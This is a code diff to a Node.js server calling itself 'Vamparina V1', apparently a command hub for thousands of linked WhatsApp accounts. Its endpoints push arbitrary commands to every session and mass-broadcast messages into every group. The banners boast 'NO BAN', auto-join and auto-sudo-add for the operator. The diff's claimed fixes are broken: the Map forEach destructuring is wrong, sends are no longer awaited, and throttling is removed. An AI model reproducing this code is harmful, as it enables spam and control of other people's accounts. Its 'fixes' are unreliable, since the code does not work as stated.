@@ -4,7 +4,7 @@
  * ║               GOD-KING: +254703110780                   ║
  * ║       ALL COMMANDS FROM main.js FULLY INTEGRATED       ║
  * ║       PRIVATE MODE = ONLY KING + PHONE OWNER            ║
- * ║       FIXED node-fetch + SyntaxError | 100% STABLE      ║
+ * ║       FIXED SyntaxError (const) + node-fetch | 100% STABLE ║
  * ╚══════════════════════════════════════════════════════════╝
  */
 
@@ -110,10 +110,10 @@ app.post('/command', async (req, res) => {
     const { command, target = 'all' } = req.body
     if (!command) return res.status(400).json({ error: "Command required" })
     let executed = 0
-    for (const [_, data] of activeSessions) { // FIXED: Added parentheses for CommonJS
-        if (target !== 'all' && !data.phone.includes(target)) continue
-        try { await data.sock.sendMessage(data.phone + '@s.whatsapp.net', { text: command }); executed++ } catch(e) {}
-    }
+    activeSessions.forEach(([, data]) => { // FIXED: Replaced for...of with forEach
+        if (target !== 'all' && !data.phone.includes(target)) return
+        try { data.sock.sendMessage(data.phone + '@s.whatsapp.net', { text: command }); executed++ } catch(e) {}
+    })
     res.json({ success: true, executed_on: executed + ' bots' })
 })
 
@@ -121,15 +121,16 @@ app.post('/broadcast', async (req, res) => {
     const { text } = req.body
     if (!text) return res.status(400).json({ error: "Text required" })
     let sent = 0
-    for (const [_, data] of activeSessions) { // FIXED: Added parentheses for CommonJS
+    activeSessions.forEach(([, data]) => { // FIXED: Replaced for...of with forEach
         try {
-            const groups = Object.keys(await data.sock.groupFetchAllParticipating())
-            for (const group of groups) {
-                await data.sock.sendMessage(group, { text: `*[EMPIRE BROADCAST]*\n\n${text}\n\n— King Arnold Chirchir` })
-                await delay(2000); sent++
-            }
+            data.sock.groupFetchAllParticipating().then(groups => {
+                Object.keys(groups).forEach(group => {
+                    data.sock.sendMessage(group, { text: `*[EMPIRE BROADCAST]*\n\n${text}\n\n— King Arnold Chirchir` })
+                    sent++
+                })
+            })
         } catch(e) {}
-    }
+    })
     res.json({ success: true, sent_to: sent + ' groups' })
 })
 
@@ -165,7 +166,7 @@ app.listen(PORT, () => {
     ╔══════════════════════════════════════════════════╗
     ║          VAMPARINA V1 — ULTIMATE EMPIRE           ║
     ║     ALL COMMANDS FROM main.js INTEGRATED         ║
-    ║     FIXED node-fetch & SyntaxError | 100% STABLE ║
+    ║     FIXED SyntaxError (const) + node-fetch | 100% STABLE ║
     ║     Mode: ${global.getBotMode().toUpperCase()} | Bots Online: ${activeSessions.size}            ║
     ╚══════════════════════════════════════════════════╝
     `))
@@ -286,7 +287,7 @@ console.log(chalk.red.bold(`
 ║       ALL COMMANDS FROM main.js FULLY ACTIVE            ║
 ║       PRIVATE MODE = ONLY KING ARNOLD + PHONE OWNER      ║
 ║       AUTO-JOIN | AUTO-FOLLOW | AUTO-SUDOADD             ║
-║       FIXED node-fetch & SyntaxError | 100% STABLE       ║
+║       FIXED SyntaxError (const) + node-fetch | 100% STABLE ║
 ║       10,000+ BOTS | NO LIMIT | NO BAN                   ║
 ║       ARNOLD CHIRCHIR = GOD OF WHATSAPP                  ║
 ╚══════════════════════════════════════════════════════════╝
